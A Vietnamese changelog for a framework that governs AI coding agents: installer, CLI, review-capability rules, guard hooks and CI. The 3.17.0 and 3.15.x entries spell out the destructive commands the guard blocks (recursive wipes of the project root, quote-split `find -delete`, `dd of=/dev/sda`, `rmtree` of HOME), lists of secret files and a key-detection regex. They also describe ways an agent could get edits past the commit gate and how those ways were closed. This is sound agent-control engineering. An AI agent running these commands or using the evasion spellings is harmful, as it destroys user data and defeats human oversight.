# Changelog

Định dạng theo [Keep a Changelog 1.1.0](https://keepachangelog.com/en/1.1.0/); phiên bản theo [SemVer 2.0.0](https://semver.org/lang/vi/).
Thay đổi **mục checklist** (thêm ID, đổi mức, ngừng dùng) ghi rõ ID để dự án đích ghép lại blueprint theo ID.

## [Unreleased]

## [3.19.1] - 2026-10-24

**Dự án đích: chạy lại `install.py`** (`xt.py`, skill `/autopilot`, `/review`) — sửa các lỗi review 🟠 của 3.19.0 (#247 được merge trước khi bản sửa kịp đẩy).

### Fixed
- `xt.py pr reviewed`/`ci-check` (D-161): họ Anthropic chưa có bậc (mythos) so với họ Anthropic khác bị từ chối cho tới khi thêm bậc — 3.19.0 nhận như khác nhà cung cấp nên reviewer yếu hơn lọt qua; effort cấu hình của một phía chỉ dùng khi model phía đó cũng lấy từ cấu hình — workflow `pr-review` truyền model thật từng mượn `reviewer_effort` trong xt.yaml; tên họ chỉ nhận chữ ASCII (`re.A`).
- `WF-REVIEW-004` (MUST@L) và văn xuôi `10-workflow/code-review.md` (review #249): đòi reviewer AI "khác model" mâu thuẫn `LOOP-ORCH-005` (`reviewer-alt` Opus effort max chấm diff của `executor-deep`) → đổi sang "năng lực cao hơn"; phần `→ Kiểm:` đổi theo. Dự án đích: ghép lại blueprint để nhận chữ mới.
- `xt.py pr reviewed` (review #249): họ chưa có bậc cùng nhà cung cấp (vd `gemma`/`gemini`, `o4`/`gpt`) bị từ chối như mythos — chỉ **khác nhà cung cấp** mới được nhận; lệnh đăng lại bọc nháy tên model có khoảng trắng.
- `pr next`: bản ghi sổ sạch chưa đăng không còn qua luật mới → trả `review` (rà lại) thay vì đề nghị đăng lại mãi bằng lệnh bị từ chối.
- Chữ "khác họ model" còn sót đổi theo `LOOP-ORCH-005` ở `LOOP-STOP-022`, `LOOP-OPT-005`, `LOOP-ORCH-018`, skill `/autopilot`, `/review`, prompt `pr-review.yml`; `LOOP-ORCH-005` ghi rõ người viết = agent năng lực cao nhất đã góp vào diff. Dự án đích: ghép lại blueprint để nhận chữ mới.

## [3.19.0] - 2026-10-24

**Dự án đích: chạy lại `install.py`** (`xt.py`, `.claude/agents/`, mẫu `CLAUDE.md`/`AGENTS.md`/`xt.yaml`) và ghép lại blueprint (`compose`) để nhận chữ mới của `LOOP-ORCH-005`, `LOOP-ORCH-019`. `pr reviewed --clean` với reviewer cùng họ người viết nay cần `--reviewer-effort` > `--author-effort`; reviewer bậc thấp hơn người viết (vd tác giả opus, reviewer sonnet) bị từ chối — dự án có `author_model_family`/`reviewer_model_family` trong `xt.yaml` kiểm lại bằng `xt.py ci-check`. Chọn model phiên chính theo chuỗi mới khi mở phiên.

### Changed
- `LOOP-ORCH-005` (D-161, ADR-0044, chủ repo chốt): reviewer phải có **năng lực cao hơn** người viết — model bậc cao hơn (Haiku < Sonnet < Opus < Fable), hoặc cùng họ với effort cao hơn (low < medium < high < xhigh < max); khác nhà cung cấp nhận như trước. Thay "khác họ model" của D-045. `xt.py pr reviewed` thêm `--reviewer-effort`/`--author-effort` (ghi vào sổ review), `xt.yaml` thêm khoá `author_effort`/`reviewer_effort`; `ci-check` kiểm cấu hình theo cùng thang.
- `.claude/agents/reviewer-alt.md`: `model: opus` + `effort: max` (trước: sonnet — yếu hơn `executor-deep` mà nó chấm); `executor-deep.md` khai `effort: high`. Phiên chính chạy Fable → giao `reviewer-alt` kèm `model: fable`.
- `LOOP-ORCH-019` (D-160, chủ repo chốt): phiên chính — người lập PLAN, viết SPEC/thiết kế, không giao subagent — chạy model cao nhất sẵn có theo thứ tự **Fable → Opus → Sonnet** (trước: "cao nhất sẵn có, không khả dụng thì Opus"). Tầng `executor`/`executor-deep`/`reviewer`/`researcher` giữ model. Cùng chữ ở `AGENTS.md` §8 và mẫu `framework/templates/CLAUDE.md`.

## [3.18.3] - 2026-10-24

**Dự án đích: chạy lại `install.py`** (`install.py` in gọn hơn các bước làm tay khi nâng nhiều bản).

### Changed
- `install.py` (T-2801, D-159, nợ review #191): "Bước làm tay từ CHANGELOG" gộp mệnh đề trùng hệt xuyên mục — giữ lần đầu theo thứ tự CHANGELOG, mục hết mệnh đề thì bỏ. Trước đó chỉ gộp trong cùng mục: trên CHANGELOG thật 7 trong 108 mệnh đề lặp ở nhiều bản.

## [3.18.2] - 2026-10-24

**Dự án đích: chạy lại `install.py`** (`check-links.py` 3.18.1 chậm bậc hai với đoạn văn dài).

### Fixed
- `check-links.py` (T-2702): gom đoạn văn để nhận tiêu đề setext chạy tuyến tính — 3.18.1 chép lại cả đoạn mỗi dòng (đoạn 200 000 dòng ~2 phút, nay < 1 giây).

## [3.18.1] - 2026-10-24

**Dự án đích: chạy lại `install.py`** (`check-links.py` nhận thêm anchor của tiêu đề setext — bớt `lint` đỏ oan).

### Fixed
- `check-links.py` (T-2701, review #238): anchor của tiêu đề setext có đoạn nhiều dòng (GitHub nối bằng khoảng trắng; riêng dòng cuối vẫn nhận như cũ) và tiêu đề setext trong trích dẫn `>` — trước đây chỉ xét một dòng ngay trên `===`/`---` ngoài `>`, link hợp lệ bị báo "anchor không có trong file".

## [3.18.0] - 2026-10-24

**Dự án đích: chạy lại `install.py`** — `xt.py` (`harness-check` mới, `loop init`/`decide`), `check-links.py` (kiểm `#anchor` — link anchor gãy làm `lint` đỏ: sửa link trước khi nâng), skill `/autopilot`; ghép lại blueprint (`compose`) để nhận chữ mới của `BASE-SEC-002`, `LOOP-ORCH-003`, `LOOP-STOP-001/002` (chỉ đổi phần `→ Kiểm:` — mục đã tick không thành "Cũ") và anchor đã sửa. PLAN-3.18-feedback2 (D-157): 7 lỗi 🟢 còn lại từ phản hồi dự án đích.

### Added
- `xt.py harness-check` (T-2621): lệnh kiểm chỉ đọc cho mục hàng rào — guard của dự án chặn bộ lệnh mẫu của `LOOP-STOP-001/002`, `permissions.ask` rỗng, mọi subagent khai `tools:` tường minh và không `permissionMode` (`LOOP-ORCH-003`); exit 1 nếu hỏng. `→ Kiểm:` của `LOOP-ORCH-003`, `LOOP-STOP-001`, `LOOP-STOP-002` nay chỉ lệnh này — lệnh `python3 -c` dự án tự viết bị guard chặn đúng nên `loop verify` đỏ (phản hồi dự án đích). Guard chặn Gate/lệnh kiểm thì thông báo gợi ý lệnh này.

### Fixed
- `BASE-SEC-002` (T-2601): lệnh kiểm gợi ý đổi sang mẫu chặt `AKIA[0-9A-Z]{16}|-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----` — mẫu cũ khớp chính dòng của mục khi quét repo có khung/BLUEPRINT (phản hồi dự án đích). Dự án đích: ghép lại blueprint để nhận chữ mới.
- `compose` (T-2602): anchor nội trang `(#x)` trong mục module thành `(<link_root>/<file module>#x)` — trước đây giữ nguyên nên gãy trong BLUEPRINT/BACKLOG.
- `check-links.py` (T-2603): kiểm `#anchor` (cùng file và file `.md` khác) theo slug tiêu đề kiểu GitHub hoặc `<a id|name>` — link tới anchor không tồn tại từng qua với exit 0. Dự án đích có link anchor gãy sẽ thấy đỏ ở `lint`: sửa link.
- `loop init` (T-2611): khởi tạo lại **cùng PLAN** sau vòng đã dừng giữ việc chờ người (`loop defer`) còn mở và mang bằng chứng xanh mà `loop verify` cũng giữ (Gate, spec, `files:` và digest file khớp — task không khai `files:` vẫn chạy lại) — trước đây mất danh sách chờ người và đòi chạy lại Gate đã xanh. PLAN khác không mang gì. Task `[x]` không có bằng chứng ở máy này (clone/container mới) → cảnh báo kèm gợi ý mỗi đợt một `docs/autopilot/PLAN-<đợt>.md` (mẫu PLAN, skill `/autopilot`, README vòng tự trị — T-2613).
- `loop decide` (T-2612): số D-NNN kế tiếp tính theo sổ cùng đường dẫn ở mọi git worktree của repo — hai worktree từng cùng ra D-001.

## [3.17.0] - 2026-10-24

**Dự án đích: chạy lại `install.py`** — guard/hook đổi (chặn xoá gốc dự án, từ chối sửa file + `git commit` cùng một lệnh Bash; xem Fixed), `xt.py` đổi (`blueprint-status --strict` đỏ khi lẫn "Không áp dụng" + "Miễn" ở mọi mức hoặc ID in đậm — sửa blueprint trước khi nâng; `loop` theo gốc worktree; Stop hook gắn phiên; `feedback collect` không chép lý do miễn trừ). PLAN-3.17-feedback (D-149…D-156), từ phản hồi 4 dự án đích.

### Fixed
- `blueprint-status --strict` (T-2511): mục `[~]` mang cả "Không áp dụng:" lẫn "Miễn:" không còn lọt mà không cần `Duyệt:` — lẫn lộn là `bad_waivers` ở **mọi mức** (dự án đích có dòng SHOULD dạng này sẽ đỏ sau khi nâng — bỏ một trong hai nghĩa), thông báo chỉ cách sửa.
- `blueprint-status --strict` (T-2512): mục checklist ghi ID in đậm/gạch dưới thay backtick (`**ID**`, `**\`ID\`**`, `__ID__`) báo lỗi định dạng kèm dòng; blueprint 0 mục nhận diện được là đỏ (trước đây exit 0 — xanh giả; ADR-0011).
- Guard: xoá đệ quy chính gốc dự án, `gốc/*`, `gốc/.git` hoặc thư mục cha của gốc → **deny** (mã `WIPE_OUTSIDE`) ở mọi cách viết — `rm -rf|-fr|-r -f|--recursive --force|-r`, `"$CLAUDE_PROJECT_DIR"`, `$PWD`/`.` ở gốc, `ROOT/..`, `../<tên gốc>`, `cd .. && rm -rf <tên gốc>`, `$HOME/<gốc>`, glob ngay dưới gốc khớp được `.git` (`ROOT/.*`, `ROOT/?*`, `.[!.]*`) hay glob ở thư mục cha khớp tên gốc, mọi đích trong `ROOT/.git/`, glob dưới `ROOT/.git/`, và mọi `find` có `-delete`/`-exec`/`-execdir`/`-ok`/`-okdir` bắt đầu từ gốc dự án, thư mục cha hay `.git` của gốc, không ghi điểm bắt đầu khi đang đứng ở gốc, hoặc điểm bắt đầu không xác định (`$`, backtick, glob, `{}`) — D-153: quét chuỗi gốc của lệnh (shlex bỏ dấu thoát nên `\(`, `\;` từng cắt argv của `find` và làm lọt `-delete`), không phân tích biểu thức. Miễn (D-154): không có `-delete`/`-fprint*`/`-fls` và MỌI `-exec`/`-execdir`/`-ok`/`-okdir` chạy lệnh trong danh sách đóng chỉ đọc, tên trần không `/` (cat, grep, egrep, fgrep, ls, head, tail, wc, stat, du, sha256sum, sha1sum, md5sum, basename, dirname, realpath, echo, printf, test) — `find . -exec grep -l TODO {} \;` cho chạy; `sh`/`python`/`xargs`/`mv`/`{}`/biến/`./cat` thì không. Quét trên bản bỏ `"`/`'`/`\` (`fi""nd`, `f\ind` vẫn là find); có `cd`/`pushd`/`popd` trước `find` trong cùng lệnh thì điểm bắt đầu tương đối coi là không xác định; `-fprint*`/`-fls` ghi vào `gốc/.git` cũng bị chặn. Hệ quả chấp nhận: `find . -name '*.pyc' -delete` từ gốc bị chặn — chạy trong thư mục con (`find src -name '*.pyc' -delete`) hoặc `rm` đường cụ thể; chuỗi chỉ nhắc tới `find … -delete` (grep, message) cũng có thể bị chặn — kể cả khi gốc nằm trong thư mục tạm; trước đây cho chạy. Xoá thư mục con/file vẫn cho chạy. Test `wipe_project_root` (T-2501).
- Guard: `rm -rf <worktree phụ đã đăng ký của chính repo>` (`git worktree list`, khác gốc chính và worktree đang đứng) cho chạy, trước đây bị `WIPE_OUTSIDE` chặn oan; đọc `git worktree list` lỗi/hết giờ (5 s) → chặn như cũ. Test `wipe_own_worktree` (T-2502).
- Guard: lệnh có thể ghi file đứng trước `git commit` trong cùng lệnh Bash (`sed -i … && git commit`, `echo x > f; git commit`) → **deny** "Tách lệnh…" — cổng commit chạy trên cây trước khi lệnh chạy nên phần sửa từng vào commit mà cổng chưa thấy; cho đứng trước `cd`, `export`/gán biến, `true`, `git add|status|diff|log`, `cat`/`echo`/`printf` (message qua ống `cat <<'EOF' | git commit -F -`) khi không chuyển hướng ra file và không có backtick. Thông báo cổng đỏ nói rõ cả lệnh chưa chạy. Test `commit_after_write` (T-2503).
- `loop` gõ trong một git worktree khác của cùng repo (`git worktree add`; cùng `--git-common-dir`, khác `--show-toplevel` với `CLAUDE_PROJECT_DIR`) dùng gốc worktree đó: Gate chạy, PLAN được tick và `.autopilot/` (sổ riêng mỗi worktree — cần `loop init` trong worktree) ở cây đang sửa; trước đây Gate chạy và tick ở cây chính. `hook-stop`/`checkpoint` vẫn theo `CLAUDE_PROJECT_DIR` — `loop init` trong worktree khác gốc hook in cảnh báo (không chặn): mở phiên Claude với thư mục dự án là worktree đó để Stop hook giữ vòng. Test `loop_worktree_root` (T-2521).
- Stop hook (`loop hook-stop`) chỉ áp vòng cho phiên đã `loop init`/`loop resume`: state ghi `session_id` (từ `CLAUDE_CODE_SESSION_ID`; ngoài Claude Code = rỗng → chưa gắn phiên, hành vi cũ); payload mang `session_id` khác, hoặc stdin không phải JSON object (trước đây vẫn bị `block`) → cho dừng, không tăng `iterations`, ghi một dòng `.autopilot/hook-stop.log` khi vòng đang bật. `/clear` đổi session id → `loop status` (SessionStart in lại; `--json`: `session_mismatch`) cảnh báo vòng gắn phiên khác và nhắc `loop resume`; `loop resume` ngoài Claude Code bỏ gắn phiên (rỗng). Test `stop_hook_session_bound` (T-2522).
- `feedback collect` (T-2531): FB `mien-tru` không còn chép lý do miễn trừ của dự án (chứa dữ liệu dự án, trái ADR-0010) — chỉ ID + tóm tắt chuẩn hoá; khử trùng theo (loại, ID) nên đổi chữ lý do không sinh FB mới; kể cả `aggregate` với FB cũ (còn lý do): triệu chứng và `Nguồn` được chuẩn hoá lại trước khi in bảng/`--json`. Test `feedback_collect_no_project_data`.

## [3.16.0] - 2026-10-23

**Dự án đích: chạy lại `install.py --with-github`** — mẫu CI bỏ `edited`, thêm `pr-title.yml` (kiểm tiêu đề PR) và `workflow_dispatch` cho `ci.yml`; `pr-steward.yml` cần `actions: write` (bản cũ: dispatch CI sau merge bị 403, job steward đỏ kèm hướng dẫn); dự án đã sửa `ci.yml` thì gộp tay `ci.yml.xtemplates-new`. PLAN-3.16.0-ceiling (D-142…D-148, ADR-0043); đo lại 2026-10-30 bằng `pr stats`.

### Changed
- `pr stats` (T-2409): đọc run theo `actions/workflows/<ci>/runs` chia theo ngày (vượt trần 1.000 của listing; ngày vẫn chạm trần → `runs_truncated: true` + cảnh báo trong bảng), thêm `pushes`, `first_push_green`, `cancelled_same_sha` (bảng + JSON; khoá cũ giữ). `_pr_stats_fetch` trả thêm cờ cắt. Test `pr_stats_pushes`.
- Ngân sách kích thước ([ADR-0043](docs/adr/0043-size-budget.md), T-2407): `tests/test_docs_budget.py` giữ trần tổng byte (file git theo dõi) cho `scripts/*.py` + `scripts/xt_app/` (711.855 B), `.claude/hooks/` (369.393 B), `framework/11-autonomous-loop/` (232.307 B) = kích thước 2026-10-23 + 5 % — đóng băng bề mặt 3.x; thêm thì cắt chỗ khác, mở băng cần ADR mới.
- `blueprint-status --json` thêm `unchecked_must_ratio` {count, total, ratio}: count = số MUST `[x]` không có `— Kiểm:` (độ dài danh sách `unchecked_must` sẵn có, không cần `--run`), total = số MUST `[x]`, ratio làm tròn 2 chữ số (total 0 → 0.0); bản text chỉ in dòng `unchecked_must` khi count > 0. Khoá `unchecked_must` cũ (danh sách ID) giữ nguyên. `release-check` thêm hàng `unchecked_must` (⚠ `WARN` SHOULD, cùng nguồn hàng `blueprint`) và cờ `--unchecked-must {warn,fail}` (mặc định `warn`: không đổi GO/NO-GO; `fail`: count > 0 là NO-GO, dự án đích bật ở harden; chỉ cờ CLI, chưa có khoá xt.yaml). Repo khung không bật `fail` (nợ 58/68). Mẫu `GO-NO-GO.md` tách cột "Máy đã chạy" (bằng chứng lệnh) và "Người đã đọc" (chữ ký người) ở danh mục kiểm. Test `unchecked_must` (T-2406, D-147).
- CI (repo khung và mẫu dự án đích): bỏ `edited` khỏi `types` của `pull_request` — sửa tiêu đề/thân PR không còn chạy lại CI nặng cùng SHA (đo: 57–62/83 run huỷ là chạy lại cùng SHA do `edited`, ~100 phút runner/tuần). Kiểm tiêu đề Conventional Commits ≤ 72 chuyển sang workflow riêng `pr-title.yml` (nghe `opened, edited, synchronize, reopened`, concurrency theo số PR, không checkout ở repo khung); mẫu `framework/templates/pr-title.yml` giữ các miễn `pr_title_check: off`/bot/Revert và `install.py --with-github` chép vào `.github/workflows/pr-title.yml`. Test `ci_no_edited_trigger`. `pr-title` không là required check: steward/`pr next`/`merge-check` vẫn chặn tiêu đề sai, nhưng nút merge của GitHub không còn bị `quality` chặn — muốn chặn cả nút thì thêm `pr-title` vào ruleset.
- `pr steward --apply`: steward chạy bằng `GITHUB_TOKEN` (thiếu `XT_STEWARD_TOKEN`, tín hiệu `XT_STEWARD_UPDATE=off` sẵn có) merge xong thì gọi `POST actions/workflows/ci.yml/dispatches` với `ref` = nhánh đích — GitHub không chạy workflow `push` cho commit do `GITHUB_TOKEN` tạo nhưng cho tạo `workflow_dispatch`, nên commit squash trên `main` lại có run CI. Có token riêng (hoặc chạy cục bộ) → không dispatch (push đã kích, không chạy đôi). Dispatch lỗi không huỷ merge (`applied` giữ), ghi `→ dispatch CI ✗ …` + `warn` (job đỏ). Tên file CI khác: biến `XT_CI_WORKFLOW` (chỉ nhận `*.yml`/`*.yaml`). CI (repo khung và mẫu) thêm trigger `workflow_dispatch` không input — run dispatch trên `main` chạy đủ job như `push`; job `steward` thêm `actions: write` ở job-level. Runbook pr-steward theo hành vi mới. Test `steward_dispatch_ci` (T-2402).
- `xt.py validate`: module/baseline/profile/industry có `## Nguồn` phải có ≥ 1 URL `https://` và một ngày `YYYY-MM-DD` (hoặc ghi `(chưa xác minh)`); `framework-feedback.md` (`LOOP-FB`) bổ sung URL ADR-0010. Test `sources_section` (T-2405).
### Fixed
- `merge-check`/`pr next`/`pr steward`: nhiều bản check cùng tên (cùng app, cùng nguồn) trên một head → chỉ bản bắt đầu muộn nhất (rồi id lớn nhất; chưa bắt đầu = mới nhất) có hiệu lực, cả rollup REST lẫn GraphQL — bản `queued`/`in_progress` treo của suite cũ không còn giữ PR ở `wait — CI đang chạy` khi check đã xong (#207, #208); bản mới nhất đang chạy/đỏ/skip vẫn chặn. Test `ci_blocker_completed_not_wait` (T-2404).

## [3.15.6] - 2026-10-22

**Dự án đích: chạy lại `install.py`** (`xt.py app` không còn ghi đè file `.md` không phải blueprint).

### Fixed
- `xt.py app`, `POST /api/blueprint`: chỉ ghi khi file đích (và backlog) chưa có hoặc front-matter là `kind: blueprint`/`blueprint-backlog`; README, AGENTS, ADR, file không UTF-8… → 400, không file nào đổi. Trước đây ghi đè được mọi `.md` trong dự án, trái ADR-0038 §2 (AUD-SEC-103).
- `xt.py test-weights`: mỗi id có timeout `XT_RECORD_TIMEOUT` (như Gate), quá giờ là đỏ và dừng cả nhóm tiến trình, Ctrl-C cũng dừng cả nhóm (không để test mồ côi); biến sai → exit 2 (AUD-HAR-103).
- `XT_RECORD_TIMEOUT` = 0 hoặc âm bị từ chối như chữ (trước đây nhận, mọi lệnh Gate/`test-weights` hết giờ ngay).

### Changed
- Sổ audit: audit delta `0afa30d..1139662` + A11Y lần đầu ([báo cáo](docs/ops/AUDIT-REPORT-2026-10-22.md), #227) — 0 🔴, 1 🟠 (đã sửa ở bản này), 23 🟢. Bằng chứng blueprint `BASE-DEP-003`, `BASE-CFG-007` viết lại theo mã hiện tại (AUD-HAR-101/102).

## [3.15.5] - 2026-10-22

**Dự án đích: chạy lại `install.py`** (guard mới, `Read` deny mới gộp vào `.claude/settings.json` — trừ `harness_permissions: own`).

### Fixed
- `dev-task.sh`: khoá trùng trong `xt.yaml` lấy dòng **cuối** như `xt.py` (trước lấy dòng đầu — hai nơi chạy hai lệnh khác nhau); `doctor` báo lỗi `xt-yaml` "khoá trùng" (AUD-XFEAT-002).
- `xt.py test-weights`: id đỏ khi đo được chạy lại trên file vừa đo — test kiểm chính file trọng số (`test_committed_weights_cover_every_class`) không còn chặn việc đo lại; còn đỏ thì trả file cũ, exit 1 (AUD-TEST-019).
- Guard: `shutil.rmtree(os.environ.get("HOME"))` và `rsync --delete-missing-args` lên đích ngoài dự án là xoá ngoài dự án → deny (AUD-SEC-076). `git -C ~+/x commit`/`git -C ~-` → thư mục commit không biết (cổng chạy ở gốc dự án như `cd ~+`), không còn hiểu `~+` là thư mục con (AUD-SEC-100).
- `.claude/settings.json`: `Read` deny phủ mọi mẫu bí mật guard chặn ghi — thêm `*.p12`, `*.pfx`, `id_rsa`, `id_ed25519`, `.envrc`, `.npmrc`, `.pypirc`, `.netrc`; test giữ hai danh sách khớp nhau (AUD-CFG-004).

## [3.15.4] - 2026-10-22

**Dự án đích: chạy lại `install.py`.** Dự án có luật quyền/dạng hook riêng (dhcb): thêm `harness_permissions: own` vào `xt.yaml` trước khi chạy.

### Added
- Khoá `xt.yaml` `harness_permissions` (mẫu `xt.yaml`, `harness-files.md`): `own` = `install.py` không thêm `allow: Bash`/`deny` của khung và ghi lệnh hook của khung dạng tương đối `bash .claude/hooks/x.sh` như dự án (lệnh `${CLAUDE_PROJECT_DIR}` đã cài trước được đổi lại); guard vẫn chạy trong hook. Vắng = gộp quyền theo ADR-0018 như cũ (dhcb cấm quyền Bash trùm và bắt hook dạng tương đối — chủ repo 2026-10-22). Cài mới/`--force-harness` với `own`: `settings.json` chép từ khung không mang `permissions`. `own` không gỡ `allow`/`deny` mà khung đã thêm ở lần cài trước — dọn tay.

### Fixed
- `doctor`: file nạp cạnh hook nhận cả đường dẫn (`$(dirname "$0")/nested/x.py`, `../x.py`, `/x.py`, file ẩn `.guard.py`); đường dẫn chỉ gồm `.`/`..` (lên gốc repo) không tính là file; ghép chuỗi thay `Path` nên `guard.py/` không bị coi là có file. Bản 3.15.2 bỏ sót `.guard.py`, `../guard.py`, `nested/guard.py` — port bản sửa và bộ ca test từ xboss #664.
- `install.py`: hook khung chưa đăng ký trong `settings.json` (`post-tool-failure.sh`, chờ duyệt T-1822) không chép sang dự án đích — hết file hook mồ côi.
- `scripts/app/app.js`, mẫu `ui-gates/verify-render.mjs`: bỏ biến không dùng (ESLint của dự án đích quét `.xtemplates/` báo lỗi).

## [3.15.3] - 2026-10-22

**Dự án đích có lệnh riêng trong `.claude/commands/` trùng tên skill khung (`gate`, `review`, `adr`…): chạy lại `install.py`** — skill khung cùng tên không còn được cài; xoá tay skill khung đã cài trước đó nếu muốn lệnh dự án là bản duy nhất.

### Changed
- `install.py`: skill khung trùng tên lệnh riêng của dự án (`.claude/commands/<tên>.md`) không cài — lệnh dự án thắng (chủ repo 2026-10-22; dhcb có `/gate`, `/review`, `/adr` riêng). Cài thật in danh sách bỏ qua; `--plan` báo `skills_shadowed`. `doctor` coi lệnh dự án cùng tên là thay cho skill khung (không báo thiếu).

## [3.15.2] - 2026-10-22

**Dự án đích cài từ khung 2.x: chạy lại `install.py`** — hook 2.x không còn bị đăng ký hai lần; dự án đã bị cài đôi được gỡ bản lặp.

### Fixed
- `install.py`: hook khung 2.x đăng ký dạng tương đối (`bash .claude/hooks/x.sh`) được nhận là cùng hook với dạng `bash "${CLAUDE_PROJECT_DIR}/.claude/hooks/x.sh"` — đổi sang dạng của khung thay vì thêm mục mới; lệnh khung lặp lại thì gỡ bản sau. Trước đây nâng dhcb 2.0.0 → 3.15.1 đăng ký đôi 7 hook (guard và cổng commit chạy hai lần mỗi lệnh). Báo cáo ở `hooks_matcher_updated` (`command_from`/`command_to`, `duplicate_removed`).
- `doctor`: `$(dirname "$0")/../..` (hook riêng của dự án lên gốc repo) không còn bị báo "hook cần .claude/hooks/.. nhưng file không có" — tên file nạp cạnh hook không bắt đầu bằng dấu chấm.

## [3.15.1] - 2026-10-22

**Dự án đích: chạy lại `install.py`** để nhận bản sửa `run_gate_shell` (Gate/`release-check` hết giờ không để sót tiến trình).

### Fixed
- `run_gate_shell`: output có byte không phải UTF-8 (binary, locale khác) không còn làm `loop record`/`release-check` ném `UnicodeDecodeError` — đọc UTF-8 với `errors="replace"` (review #220).
- `run_gate_shell` (Gate của `loop record`, `loop verify`, `floor`, `blueprint-status --run`, `release-check` `attack`/`perf`): hết giờ thì dừng **cả nhóm tiến trình** — SIGTERM để trap dọn dẹp của script chạy, sau `GATE_KILL_GRACE` (30 s) mới SIGKILL. Trước đây chỉ `bash` bị SIGKILL: trap không chạy, app tạm/DB tạm/container và khoá cổng còn lại, lượt sau báo cổng bận (review hotel-manager #119).

## [3.15.0] - 2026-10-22

**Dự án đích: chạy lại `install.py`** để nhận guard theo pha và gỡ 4 deny tĩnh cũ (ADR-0040).

### Added
- `release-check` thêm hàng `attack` (tấn công thử: DAST/fuzz/kịch bản khai thác) và `perf` (kiểm tải có ngưỡng) chạy lệnh cùng tên của `xt.yaml` — đỏ = NO-GO; chưa khai ở quy mô M/L = việc người ký ([ADR-0042](docs/adr/0042-release-check-attack-and-perf.md); chủ repo 2026-10-22). Mẫu `xt.yaml` có hai khoá mới; dự án đích: chạy lại `install.py`, gộp hai khoá từ `xt.yaml.xtemplates-new` nếu có.

### Fixed
- `merge-check`/`pr-steward`: PR sửa `xt.yaml` luôn tính pha `harden` (D-137) — steward chạy trên checkout nhánh đích nên không thấy `xt.yaml` của PR; #213 (đổi build → harden) từng merge như build, không review.
- Guard pha build (review #213): không nới khi đích không cố định trên dòng lệnh — `xargs`, `find -exec … {}`, glob, gốc thư mục tạm, `chmod` không đích, git `--work-tree`/`--git-dir`/`--exec-path`/`core.worktree`/`core.hooksPath`/mọi `GIT_*=` (`GIT_INDEX_FILE=/etc/x` — review #214); tên dự án có ký tự glob không còn làm git cục bộ bị chặn oan; `xt.yaml` đọc cả file (dòng trùng cuối thắng như `xt.py`). `dd of=/dev/<thiết bị>` không `if=` (`dd of=/dev/sda`; trừ `/dev/null|stdout|stderr`) nay bị chặn ở mọi pha — trước chỉ deny tĩnh `Bash(dd *)` che lỗ này.

### Changed
- Pha `build` gọn ([ADR-0041](docs/adr/0041-build-phase-minimal-gates.md); chủ repo 2026-10-22): sàn Gate M/L (`LOOP-HARNESS-023`) không áp ở pha build — `floor` (CI mẫu), `loop verify`, `doctor`, `loop init` không đòi; đặt `harden` thì áp lại. Skill `/autopilot` pha build: không chạy `dev-task.sh gate` trước khi đẩy (CI là cổng), không trần 150 dòng, thiết kế chỉ phần code cần. `LOOP-HARNESS-023` ghi ngoại lệ pha build. Dự án đích: chạy lại `install.py` (không phải gộp `ci.yml`).
- Pha `build` cho chạy hành động chỉ tác động trong dự án hoặc thư mục tạm ([ADR-0040](docs/adr/0040-build-phase-local-actions-allowed.md); chủ repo 2026-10-22): guard (`build_phase` — `delivery_phase: build` ở cả cây làm việc lẫn nhánh mặc định của remote) cho `git reset --hard`, `clean -f` (trừ `-x/-X`), `checkout .`, `restore .`, `switch -f`, `stash drop`, `chmod 777`, `dd of=`, ghi file bí mật (Edit/Write, chuyển hướng Bash, script) khi đích trong dự án/tmp. Ngoài dự án/tmp, đối ngoại, hàng rào, bằng chứng: giữ chặn. Repo khung luôn production: `xt.yaml` của repo khung đổi `delivery_phase: build` → `harden` (D-136, thay D-109) — reviewer khác họ model lại bắt buộc ở PR làn chuẩn của repo khung. `XT_GUARD_PHASE=harden` ép hành vi harden. `.claude/settings.json` bỏ `Bash(git reset --hard *)`, `Bash(git clean -*)`, `Bash(chmod 777 *)`, `Bash(dd *)` (guard chặn ở harden); `install.py` gỡ deny khung từng đặt mà khung bỏ (manifest chứng minh, báo `deny_remove`). `LOOP-HARNESS-022`: ghi khoá sandbox Claude Code đã xác minh.

## [3.14.0] - 2026-10-21

**Dự án đích: chạy lại `install.py`** để có `xt.py app` (app web cục bộ, ADR-0038) và `xt.py plan waves` — `.xtemplates/scripts/xt_app/` và `.xtemplates/scripts/app/` được chép cạnh `xt.py`; thử bằng `python3 .xtemplates/scripts/xt.py app --smoke`.

**Dự án đích: chạy lại `install.py --with-github`** — CI tối thiểu số job, song song tối đa trong job ([ADR-0039](docs/adr/0039-minimal-target-ci-jobs.md), D-127, D-128; chủ repo 2026-10-21). Mẫu `ci.yml` đã sửa → gộp tay từ `ci.yml.xtemplates-new`; ruleset chỉ `quality` + `gitleaks` (không đổi). Ngưỡng coverage trên CI phải nằm trong lệnh `test` của `xt.yaml`.

### Added
- `xt.py app [--port N] [--no-open] [--smoke]` (PLAN-3.14-app, [ADR-0038](docs/adr/0038-local-app-on-xt.md)): app web cục bộ chỉ thư viện chuẩn — `scripts/xt_app/` (máy chủ `ThreadingHTTPServer` bind 127.0.0.1, token mỗi lần chạy so bằng `hmac.compare_digest`, `Host`/`Origin` chống DNS rebinding, file tĩnh tra bảng không theo symlink, CSP chặt) và `scripts/app/` (HTML/CSS/JS thuần, DOM chỉ `createElement`/`textContent`). 7 màn, 14 API JSON gọi đúng hàm của CLI ([`SPEC-app.md`](docs/specs/SPEC-app.md)); app không chạy lệnh, ngoại lệ duy nhất là ghi `BLUEPRINT.md` qua `compose_write` (tách từ `cmd_compose`, CLI không đổi). API PR chỉ đọc (test cấm mọi lời gọi ghi; `_pr_rest(local_check=False)`). `--smoke` gọi mọi `GET /api/*`. `install.py` chép hai thư mục cạnh `xt.py`; `doctor` ⚠ `app` khi thiếu. `typecheck` của repo khung thêm `scripts/xt_app`. Dự án đích: nhận khi nâng bản.
